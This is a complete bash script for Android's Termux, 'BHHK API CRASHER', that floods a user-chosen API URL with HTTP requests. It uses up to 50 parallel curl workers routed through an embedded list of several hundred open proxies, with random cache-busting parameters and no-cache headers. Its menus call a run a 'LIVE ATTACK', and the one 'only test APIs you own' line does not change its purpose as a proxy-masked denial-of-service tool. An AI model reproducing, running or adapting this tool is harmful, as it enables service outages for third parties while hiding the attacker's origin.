#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# BHHK API CRASHER v4.0 — Proxy Rotation Edition
# ============================================================

CYAN='\033[0;36m'
PINK='\033[0;35m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
WHITE='\033[1;37m'
DIM='\033[2m'
BOLD='\033[1m'
NC='\033[0m'

WORK_DIR="$HOME/.bhhk_crasher"
mkdir -p "$WORK_DIR"

PROXY_FILE="$WORK_DIR/proxies.txt"
GOOD_PROXY="$WORK_DIR/good_proxies.txt"

TARGET_URL=""
THREADS=10
TIMEOUT=8
TOTAL=0
OK=0
ERR=0
PROXY_USED=0
RUNNING=0

# ============================================================
# AUTO-CREATE PROXY LIST (first run)
# ============================================================
init_proxies() {
    if [ ! -f "$PROXY_FILE" ]; then
        cat > "$PROXY_FILE" << 'PROXYEOF'
129.213.162.27:17777
203.99.63.97:8090
164.52.11.194:18080
43.134.165.186:80
184.75.221.82:3118
112.216.54.226:12121
178.156.206.253:8118
46.8.43.28:3128
139.162.78.109:8080
161.35.70.249:80
103.43.191.71:8888
178.92.72.78:8080
109.199.119.160:80
80.74.54.148:3128
162.214.159.94:3128
190.110.226.122:80
140.238.32.108:3128
31.57.178.211:8080
195.114.209.50:80
41.220.16.214:80
41.184.92.221:80
143.42.66.91:80
47.85.161.37:3128
103.151.20.131:80
159.65.221.25:80
37.187.74.125:80
43.173.120.138:899
110.38.234.74:1256
97.74.87.226:80
201.222.50.218:80
108.161.135.118:80
45.43.60.220:8080
47.236.86.147:443
143.198.135.176:80
41.220.16.218:80
202.133.88.173:80
65.108.103.19:80
197.221.249.197:80
41.220.16.209:80
107.150.41.226:18080
81.90.158.110:3128
143.246.138.227:80
95.81.107.33:3128
103.86.135.114:8080
8.215.112.240:7777
103.237.102.191:11111
134.209.29.120:3128
206.245.131.160:80
185.195.71.218:18080
197.221.237.248:80
213.111.146.36:18080
5.42.127.131:80
197.221.234.252:80
162.214.74.29:8085
197.221.234.149:80
159.89.87.80:10000
183.110.216.159:8090
46.47.197.210:3128
219.93.101.60:80
219.93.101.62:80
8.219.97.248:80
46.10.209.230:8080
123.58.199.232:8168
43.167.209.118:10081
103.180.126.236:8080
80.225.88.28:8082
51.75.206.209:80
8.221.139.222:8085
34.65.99.32:3128
111.119.162.248:10909
66.151.34.89:80
94.158.49.82:3128
198.111.166.184:80
43.128.63.68:7890
194.14.207.87:8001
65.20.79.22:40000
83.166.247.254:10808
197.221.240.247:80
197.221.234.253:80
197.221.240.178:80
31.6.41.220:8118
197.221.249.196:80
178.92.72.154:8080
163.5.53.34:8082
138.68.60.8:3128
159.195.194.242:8080
5.161.50.82:8118
197.221.240.240:80
103.20.102.155:8181
159.89.239.204:10000
185.85.111.18:80
163.172.167.48:80
197.221.249.198:80
197.221.249.199:80
41.220.16.208:80
175.139.233.76:80
219.65.73.81:80
219.93.101.63:80
139.99.238.83:8080
103.133.27.143:8080
45.182.21.150:999
165.101.102.27:8083
103.184.180.2:1111
125.27.107.91:8080
69.67.151.173:3128
172.239.117.103:8080
103.54.15.163:3129
178.252.171.229:8080
198.15.30.50:8080
159.223.167.188:10000
103.82.20.76:8080
85.192.28.252:3128
79.174.12.190:80
149.129.226.9:9098
112.198.22.122:80
195.26.224.135:80
47.238.130.212:5000
34.122.187.196:80
95.129.101.73:80
174.138.119.88:80
103.65.237.92:5678
77.239.108.71:80
178.92.72.134:8080
194.150.110.134:80
31.28.4.192:80
34.140.137.151:80
109.236.88.82:80
207.180.254.198:8080
34.81.160.132:80
41.220.16.210:80
176.191.124.3:80
41.220.16.213:80
41.220.16.211:80
91.103.120.48:80
45.91.248.107:80
75.84.71.14:80
185.88.177.40:80
150.140.148.235:80
173.181.143.245:80
162.240.19.30:80
172.237.73.24:80
128.199.202.122:8080
197.221.240.176:80
47.81.56.193:8888
194.31.108.109:2080
2.189.86.84:8443
154.65.39.8:80
176.99.134.183:8090
219.65.73.80:80
151.185.58.17:80
34.44.49.215:80
38.18.230.153:8888
5.45.126.128:8080
103.87.149.19:80
180.149.44.182:3128
48.214.22.79:8080
175.139.233.79:80
41.220.16.223:80
175.139.233.78:80
41.220.16.215:80
45.80.151.33:3128
112.169.99.71:8053
165.227.169.229:3080
103.137.218.166:84
103.119.63.144:8080
103.180.127.114:8080
202.125.68.177:8080
95.140.120.188:8080
196.251.193.252:8083
45.7.64.89:99
103.162.221.164:3125
103.184.181.220:8080
138.124.117.43:3131
8.242.153.168:999
165.101.230.76:8080
62.241.133.227:1981
51.170.133.249:80
178.92.72.129:8080
118.70.13.38:41857
41.216.186.216:8080
103.88.234.239:40019
209.97.150.167:3128
107.181.155.86:80
151.243.153.157:8118
150.241.245.230:8080
165.154.162.73:8888
38.175.202.151:443
54.238.38.227:8080
8.215.112.214:7777
23.251.102.121:80
178.128.26.157:10000
65.109.215.187:8090
156.67.110.124:10808
138.197.68.35:4857
178.92.72.162:8080
85.214.107.177:80
210.177.178.14:80
151.243.236.236:80
82.41.42.135:8181
14.242.19.156:2001
202.51.106.229:8080
165.99.239.73:125
217.162.8.134:80
79.137.78.133:8005
13.143.173.60:8080
47.91.89.3:1080
104.225.220.233:80
175.111.96.157:3128
194.163.175.167:40000
141.148.206.170:3129
178.92.72.94:8080
38.49.156.238:10101
103.97.140.226:8080
203.142.71.54:8080
175.106.15.186:8080
103.160.202.218:8888
180.190.184.82:8080
103.48.71.68:3
179.1.182.25:999
163.172.53.142:80
195.158.8.123:3128
57.128.183.212:21
2.28.105.45:8888
213.199.53.168:8888
103.189.250.47:8080
103.80.88.77:8080
103.178.2.190:3125
119.15.84.74:8080
103.169.139.4:8081
82.115.60.51:80
47.91.104.88:3128
77.110.100.216:3128
8.219.74.197:8081
178.92.72.54:8080
139.59.1.14:8080
41.184.92.220:80
188.164.201.197:666
8.213.197.208:4002
8.221.138.111:8081
47.238.128.246:8443
24.173.217.114:55443
178.128.146.125:10000
8.213.134.213:443
66.114.34.156:8111
148.81.121.5:8080
103.39.75.123:8080
118.97.75.83:8080
103.55.22.236:8080
120.28.193.165:5050
103.132.54.18:8080
112.78.141.79:9091
87.215.14.228:65432
117.236.124.166:3128
93.115.20.101:1080
170.81.131.70:3128
43.203.114.231:3128
69.87.216.54:7989
190.58.248.86:80
32.223.6.94:80
41.216.191.85:8080
101.36.112.205:1081
52.34.243.150:8080
103.97.140.64:8080
14.225.2.98:808
38.127.179.219:41923
3.211.120.181:443
150.241.245.131:8080
198.199.86.113:128
8.213.151.128:3128
47.52.223.161:5872
200.94.38.46:2604
190.12.150.244:999
210.211.113.36:80
38.194.246.34:999
103.133.26.119:8080
190.60.34.250:999
149.71.241.164:8080
77.237.243.184:18080
106.51.185.233:8080
103.55.22.52:8090
103.177.11.107:8080
180.254.197.31:8080
142.147.245.182:5873
206.206.71.250:5890
185.226.207.255:574
107.181.148.191:6051
31.57.41.83:5659
31.57.82.152:6733
185.226.204.48:5601
31.58.18.123:6392
104.239.13.156:644
45.135.139.26:305
155.254.38.75:683
198.105.100.167:6418
107.181.154.146:5824
207.180.207.217:10808
81.0.49.104:18500
95.163.20.141:53
45.74.31.25:5042
181.78.67.99:1080
101.32.60.93:1080
45.74.31.30:4364
179.189.246.129:5432
94.103.2.238:1080
192.111.138.29:4145
192.111.139.163:19404
103.146.137.109:1081
68.71.242.118:4145
45.74.31.46:5146
45.74.31.22:7450
185.247.224.99:39997
216.105.130.131:4145
157.90.113.239:9052
45.74.31.25:4665
105.214.51.182:5678
38.49.210.79:40000
184.178.172.3:4145
45.74.31.41:5120
45.74.31.22:17857
72.205.0.67:4145
68.71.242.118:4145
72.194.42.156:4145
202.179.83.169:51951
200.8.235.10:4145
45.74.31.22:6013
45.74.31.23:4220
45.74.31.46:6172
45.74.31.40:4118
72.195.34.60:27391
45.74.31.42:5528
45.74.31.42:7551
45.74.31.46:10459
45.74.31.41:4322
45.74.31.25:6674
184.181.217.194:4145
179.189.249.137:5432
PROXYEOF
    fi
}
init_proxies

# ============================================================
# PROXY VALIDATOR — check alive proxies once
# ============================================================
validate_proxies() {
    clear
    echo ""
    echo -e "${CYAN}  ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}   ${PINK}🔍 PROXY VALIDATION${NC}                    ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${DIM}Testing all proxies (this may take a minute)...${NC}"
    echo ""

    > "$GOOD_PROXY"
    local total_p=$(wc -l < "$PROXY_FILE")
    local checked=0
    local alive=0

    while IFS= read -r proxy; do
        [ -z "$proxy" ] && continue
        checked=$((checked + 1))

        # Progress
        local pct=$((checked * 100 / total_p))
        printf "\r  ${CYAN}▸${NC} Testing: ${WHITE}%-30s${NC} ${PINK}[%3d%%]${NC} ${GREEN}Alive: %d${NC}" \
            "$proxy" "$pct" "$alive"

        # Test proxy with short timeout
        local code=$(curl -s -o /dev/null -w "%{http_code}" \
            --proxy "http://${proxy}" \
            --connect-timeout 3 \
            --max-time 5 \
            "http://httpbin.org/ip" 2>/dev/null)

        if [ "$code" = "200" ]; then
            echo "$proxy" >> "$GOOD_PROXY"
            alive=$((alive + 1))
        fi
    done < "$PROXY_FILE"

    echo ""
    echo ""
    echo -e "  ${GREEN}✓ Validated:${NC} ${WHITE}${alive}${NC} ${DIM}/ ${total_p} proxies alive${NC}"
    echo ""
    sleep 1
}

# ============================================================
# CLEANUP
# ============================================================
cleanup() {
    printf '\033[?25h'
    RUNNING=0
    rm -f "$WORK_DIR/run.flag" 2>/dev/null
    pkill -f "bhhk_worker_" 2>/dev/null
    echo ""
    echo -e "${YELLOW}  ⏹ Session ended${NC}"
    exit 0
}
trap cleanup INT TERM

# ============================================================
# BANNER
# ============================================================
show_banner() {
    clear
    echo ""
    echo -e "${CYAN}    ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}    ║${NC}  ${PINK}⚡  B H H K   A P I   C R A S H E R  ⚡${NC}  ${CYAN}║${NC}"
    echo -e "${CYAN}    ║${NC}    ${DIM}Proxy Rotation Engine v4.0${NC}         ${CYAN}║${NC}"
    echo -e "${CYAN}    ╚══════════════════════════════════════════╝${NC}"
    echo ""
}

# ============================================================
# BOOT ANIMATION
# ============================================================
boot_animation() {
    clear
    echo ""
    echo -e "${CYAN}    ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}    ║${NC}  ${PINK}⚡  B H H K   A P I   C R A S H E R  ⚡${NC}  ${CYAN}║${NC}"
    echo -e "${CYAN}    ║${NC}    ${DIM}Proxy Rotation Engine v4.0${NC}         ${CYAN}║${NC}"
    echo -e "${CYAN}    ╚══════════════════════════════════════════╝${NC}"
    echo ""

    local steps=(
        "Initializing core"
        "Loading proxy pool"
        "Calibrating workers"
        "Preparing terminal"
        "Ready"
    )

    for i in "${!steps[@]}"; do
        local progress=$(( (i + 1) * 100 / ${#steps[@]} ))
        local filled=$(( progress / 5 ))
        local bar=""
        for ((j=0; j<20; j++)); do
            if [ $j -lt $filled ]; then
                bar="${bar}█"
            else
                bar="${bar}░"
            fi
        done
        printf "\r  ${CYAN}▸${NC} ${WHITE}%-24s${NC} ${PINK}[${bar}]${NC} ${GREEN}%3d%%${NC}" \
            "${steps[$i]}" "$progress"
        sleep 0.2
    done
    echo ""
    echo ""
    sleep 0.3
}

# ============================================================
# WORKER — with proxy rotation
# ============================================================
worker() {
    local wid=$1
    local url=$2
    local wlog="$WORK_DIR/w${wid}.log"

    # Each worker gets its own proxy list to reduce collision
    local proxy_array=()
    if [ -f "$GOOD_PROXY" ] && [ -s "$GOOD_PROXY" ]; then
        while IFS= read -r p; do
            proxy_array+=("$p")
        done < "$GOOD_PROXY"
    else
        # Fallback to full list
        while IFS= read -r p; do
            proxy_array+=("$p")
        done < "$PROXY_FILE"
    fi

    local pcount=${#proxy_array[@]}
    [ "$pcount" -eq 0 ] && pcount=1

    local pidx=$(( (wid - 1) % pcount ))

    while [ -f "$WORK_DIR/run.flag" ]; do
        local proxy="${proxy_array[$pidx]}"
        local rnd=$(head -c 8 /dev/urandom | od -An -tx1 | tr -d ' \n')
        local sep="?"
        case "$url" in *\?*) sep="&";; esac
        local final_url="${url}${sep}_cb=${rnd}"

        local start_ms=$(date +%s%N)
        local http_code

        # Curl with proxy
        http_code=$(curl -s -o /dev/null -w "%{http_code}" \
            --proxy "http://${proxy}" \
            --max-time "$TIMEOUT" \
            --connect-timeout 5 \
            -A "Mozilla/5.0 (Linux; Android 13) BHHK/4.0" \
            -H "Cache-Control: no-cache" \
            -H "Pragma: no-cache" \
            "$final_url" 2>/dev/null)

        local end_ms=$(date +%s%N)
        local latency=$(( (end_ms - start_ms) / 1000000 ))

        if [ -z "$http_code" ] || [ "$http_code" = "000" ]; then
            echo "ERR|${wid}|${latency}|PROXY_FAIL|${proxy}" >> "$wlog"
        elif [ "$http_code" -ge 200 ] && [ "$http_code" -lt 400 ]; then
            echo "OK|${wid}|${latency}|${http_code}|${proxy}" >> "$wlog"
        else
            echo "ERR|${wid}|${latency}|${http_code}|${proxy}" >> "$wlog"
        fi

        # Rotate to next proxy
        pidx=$(( (pidx + 1) % pcount ))

        sleep 0.01
    done
    rm -f "$wlog" 2>/dev/null
    exit 0
}

# ============================================================
# LIVE ATTACK
# ============================================================
run_attack() {
    TOTAL=0
    OK=0
    ERR=0
    PROXY_USED=0
    RUNNING=1

    # Check good proxies
    if [ ! -f "$GOOD_PROXY" ] || [ ! -s "$GOOD_PROXY" ]; then
        echo ""
        echo -e "  ${YELLOW}⚠ No validated proxies found!${NC}"
        printf "  ${PINK}➜${NC} Validate now? [Y/n]: "
        read -r v
        case "$v" in
            n|N) echo -e "  ${DIM}Skipping validation (may be slow)${NC}";;
            *) validate_proxies ;;
        esac
    fi

    local proxy_count=0
    [ -f "$GOOD_PROXY" ] && proxy_count=$(wc -l < "$GOOD_PROXY")

    # Clean
    rm -f "$WORK_DIR"/w*.log "$WORK_DIR/run.flag" 2>/dev/null
    for i in $(seq 1 $THREADS); do
        : > "$WORK_DIR/w${i}.log"
    done
    touch "$WORK_DIR/run.flag"

    # Header
    clear
    echo ""
    echo -e "${CYAN}  ╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC}  ${PINK}⚡ BHHK API CRASHER — LIVE ⚡${NC}          ${CYAN}║${NC}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${DIM}Target :${NC} ${WHITE}${TARGET_URL}${NC}"
    echo -e "  ${DIM}Threads:${NC} ${WHITE}${THREADS}${NC}   ${DIM}Proxies:${NC} ${WHITE}${proxy_count}${NC}   ${DIM}Timeout:${NC} ${WHITE}${TIMEOUT}s${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${GREEN}OK:${WHITE}0${NC}  ${RED}ERR:${WHITE}0${NC}  ${PINK}TOTAL:${WHITE}0${NC}  ${CYAN}RATE:${WHITE}0/s${NC}"
    echo -e "  ${DIM}──────────────────────────────────────────${NC}"
    echo ""

    printf '\033[?25l'

    # Spawn workers
    for i in $(seq 1 $THREADS); do
        worker "$i" "$TARGET_URL" &
    done

    # Live loop
    local rate_count=0
    local rate_time=$(date +%s)
    local rate=0
    local stat_line=9
    local proxy_switches=0

    while [ -f "$WORK_DIR/run.flag" ]; do
        local new_lines=0

        for wlog in "$WORK_DIR"/w*.log; do
            [ -f "$wlog" ] || continue
            [ -s "$wlog" ] || continue

            while IFS='|' read -r status wid latency code proxy; do
                [ -z "$status" ] && continue

                TOTAL=$((TOTAL + 1))
                local t=$(date +%H:%M:%S)
                # Hide proxy middle part
                local pmask="${proxy%:*}:****"

                if [ "$status" = "OK" ]; then
                    OK=$((OK + 1))
                    printf "  ${DIM}%s${NC} ${GREEN}[OK]${NC}  ${WHITE}W%-2s${NC} ${CYAN}%5sms${NC} ${GREEN}%s${NC} ${DIM}%s${NC}\n" \
                        "$t" "$wid" "$latency" "$code" "$pmask"
                else
                    ERR=$((ERR + 1))
                    printf "  ${DIM}%s${NC} ${RED}[ERR]${NC} ${WHITE}W%-2s${NC} ${YELLOW}%5sms${NC} ${RED}%s${NC} ${DIM}%s${NC}\n" \
                        "$t" "$wid" "$latency" "$code" "$pmask"
                fi
                new_lines=$((new_lines + 1))
                rate_count=$((rate_count + 1))
            done < "$wlog"

            > "$wlog"
        done

        # Rate
        local now=$(date +%s)
        if [ $((now - rate_time)) -ge 1 ]; then
            rate=$rate_count
            rate_count=0
            rate_time=$now
        fi

        if [ "$new_lines" -gt 0 ]; then
            printf "\033[s"
            printf "\033[${stat_line};1H"
            printf "\033[K"
            printf "  ${CYAN}▸${NC} ${GREEN}OK:${WHITE}%-5d${NC} ${RED}ERR:${WHITE}%-4d${NC} ${PINK}TOTAL:${WHITE}%-6d${NC} ${CYAN}RATE:${WHITE}%d/s${NC}" \
                "$OK" "$ERR" "$TOTAL" "$rate"
            printf "\033[u"
        fi

        sleep 0.1
    done

    printf '\033[?25h'
    rm -f "$WORK_DIR/run.flag" 2>/dev/null
    sleep 0.5

    # Summary
    echo ""
    echo ""
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${YELLOW}⏹  ATTACK STOPPED${NC}                      ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${GREEN}▸ Success:${NC}  ${WHITE}${OK}${NC}"
    echo -e "  ${RED}▸ Failed:${NC}   ${WHITE}${ERR}${NC}"
    echo -e "  ${PINK}▸ Total:${NC}    ${WHITE}${TOTAL}${NC}"
    echo ""
}

# ============================================================
# START
# ============================================================
start_crasher() {
    show_banner

    echo -e "  ${CYAN}▸${NC} ${WHITE}Enter target API URL${NC}"
    echo -e "  ${DIM}  Example: api.example.com/v1/data${NC}"
    printf "  ${PINK}➜${NC} "
    read -r TARGET_URL

    if [ -z "$TARGET_URL" ]; then
        echo -e "\n  ${RED}✗ URL required${NC}"
        sleep 1
        return
    fi

    case "$TARGET_URL" in
        http://*|https://*) ;;
        *) TARGET_URL="https://${TARGET_URL}" ;;
    esac

    echo ""
    echo -e "  ${CYAN}▸${NC} ${WHITE}Select thread count${NC}"
    echo -e "    ${PINK}[1]${NC} ${WHITE}10 threads${NC}   ${DIM}(light)${NC}"
    echo -e "    ${PINK}[2]${NC} ${WHITE}25 threads${NC}   ${DIM}(medium)${NC}"
    echo -e "    ${PINK}[3]${NC} ${WHITE}50 threads${NC}   ${DIM}(heavy)${NC}"
    printf "  ${PINK}➜${NC} "
    read -r th

    case "$th" in
        2) THREADS=25 ;;
        3) THREADS=50 ;;
        *) THREADS=10 ;;
    esac

    echo ""
    echo -e "  ${YELLOW}⚠  Starting in 3 seconds (Ctrl+C to abort)${NC}"
    sleep 1
    printf "  ${CYAN}3...${NC}\n"; sleep 1
    printf "  ${CYAN}2...${NC}\n"; sleep 1
    printf "  ${CYAN}1...${NC}\n"; sleep 1

    run_attack

    printf "  ${DIM}Press ENTER to return...${NC}"
    read -r
}

# ============================================================
# PROXY MANAGER
# ============================================================
manage_proxies() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}🔌 PROXY MANAGER${NC}                       ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""

    local total=$(wc -l < "$PROXY_FILE" 2>/dev/null || echo 0)
    local good=0
    [ -f "$GOOD_PROXY" ] && good=$(wc -l < "$GOOD_PROXY")

    echo -e "  ${CYAN}▸${NC} Total proxies    : ${WHITE}${total}${NC}"
    echo -e "  ${CYAN}▸${NC} Validated proxies: ${GREEN}${good}${NC}"
    echo ""
    echo -e "  ${CYAN}╭──────────────────────────────────────────╮${NC}"
    echo -e "  ${CYAN}│${NC}  ${PINK}[1]${NC} ${WHITE}Validate all proxies${NC}                 ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${PINK}[2]${NC} ${WHITE}Show validated list${NC}                  ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${PINK}[3]${NC} ${WHITE}Add custom proxy${NC}                     ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${PINK}[4]${NC} ${WHITE}Clear validated list${NC}                 ${CYAN}│${NC}"
    echo -e "  ${CYAN}│${NC}  ${PINK}[0]${NC} ${WHITE}Back${NC}                                  ${CYAN}│${NC}"
    echo -e "  ${CYAN}╰──────────────────────────────────────────╯${NC}"
    echo ""
    printf "  ${PINK}➜${NC} "
    read -r c

    case "$c" in
        1) validate_proxies; pause ;;
        2)
            if [ -f "$GOOD_PROXY" ] && [ -s "$GOOD_PROXY" ]; then
                echo ""
                echo -e "  ${GREEN}✓ Validated proxies:${NC}"
                echo ""
                cat "$GOOD_PROXY" | while read -r p; do
                    echo -e "  ${CYAN}▸${NC} ${WHITE}$p${NC}"
                done
            else
                echo -e "  ${YELLOW}⚠ No validated proxies yet${NC}"
            fi
            pause
            ;;
        3)
            echo ""
            printf "  ${PINK}➜${NC} IP:PORT: "
            read -r newp
            if [ -n "$newp" ]; then
                echo "$newp" >> "$PROXY_FILE"
                echo -e "  ${GREEN}✓ Added${NC}"
            fi
            pause
            ;;
        4)
            > "$GOOD_PROXY"
            echo -e "  ${GREEN}✓ Cleared${NC}"
            pause
            ;;
        0) return ;;
        *) ;;
    esac
}

# ============================================================
# STATS
# ============================================================
show_stats() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}📊 SESSION STATISTICS${NC}                  ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}▸${NC} ${WHITE}Last Target:${NC}  ${PINK}${TARGET_URL:-N/A}${NC}"
    echo -e "  ${CYAN}▸${NC} ${WHITE}Threads:${NC}      ${PINK}${THREADS}${NC}"
    echo -e "  ${CYAN}▸${NC} ${GREEN}Success:${NC}      ${WHITE}${OK}${NC}"
    echo -e "  ${CYAN}▸${NC} ${RED}Failed:${NC}       ${WHITE}${ERR}${NC}"
    echo -e "  ${CYAN}▸${NC} ${PINK}Total:${NC}        ${WHITE}${TOTAL}${NC}"
    echo ""
    if [ "$TOTAL" -gt 0 ]; then
        local rate=$(( OK * 100 / TOTAL ))
        echo -e "  ${CYAN}▸${NC} ${WHITE}Success Rate:${NC} ${GREEN}${rate}%${NC}"
    fi
    echo ""
    printf "  ${DIM}Press ENTER to continue...${NC}"
    read -r
}

# ============================================================
# HELP
# ============================================================
show_help() {
    show_banner
    echo -e "  ${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "  ${CYAN}║${NC}   ${PINK}📖 HELP / INFO${NC}                        ${CYAN}║${NC}"
    echo -e "  ${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${WHITE}${BOLD}How to use:${NC}"
    echo -e "  ${CYAN}1.${NC} Validate proxies (first time)"
    echo -e "  ${CYAN}2.${NC} Select ${PINK}START${NC}"
    echo -e "  ${CYAN}3.${NC} Enter target URL"
    echo -e "  ${CYAN}4.${NC} Choose threads"
    echo -e "  ${CYAN}5.${NC} Watch live log"
    echo -e "  ${CYAN}6.${NC} Press ${PINK}Ctrl+C${NC} to stop"
    echo ""
    echo -e "  ${WHITE}${BOLD}Proxy Rotation:${NC}"
    echo -e "  ${CYAN}▸${NC} Each worker rotates through ${PINK}validated${NC} proxies"
    echo -e "  ${CYAN}▸${NC} Failed proxies are shown as PROXY_FAIL"
    echo -e "  ${CYAN}▸${NC} Re-validate anytime from Proxy Manager"
    echo ""
    echo -e "  ${YELLOW}⚠  Only test APIs you own or have permission for${NC}"
    echo ""
    printf "  ${DIM}Press ENTER to continue...${NC}"
    read -r
}

# ============================================================
# MAIN MENU
# ============================================================
main_menu() {
    while true; do
        show_banner

        local pcount=0
        [ -f "$GOOD_PROXY" ] && pcount=$(wc -l < "$GOOD_PROXY")

        echo -e "  ${CYAN}╭──────────────────────────────────────────╮${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[1]${NC} ${WHITE}⚡  START CRASHER${NC}                     ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[2]${NC} ${WHITE}🔌  PROXY MANAGER${NC}      ${DIM}(${pcount} alive)${NC}     ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[3]${NC} ${WHITE}📊  STATISTICS${NC}                        ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[4]${NC} ${WHITE}📖  HELP / INFO${NC}                       ${CYAN}│${NC}"
        echo -e "  ${CYAN}│${NC}  ${PINK}[0]${NC} ${WHITE}🚪  EXIT${NC}                              ${CYAN}│${NC}"
        echo -e "  ${CYAN}╰──────────────────────────────────────────╯${NC}"
        echo ""
        printf "  ${PINK}➜${NC} ${WHITE}Select option:${NC} "
        read -r choice
        echo ""

        case "$choice" in
            1) start_crasher ;;
            2) manage_proxies ;;
            3) show_stats ;;
            4) show_help ;;
            0) cleanup ;;
            *) echo -e "  ${RED}✗ Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# ============================================================
# ENTRY
# ============================================================
boot_animation
main_menu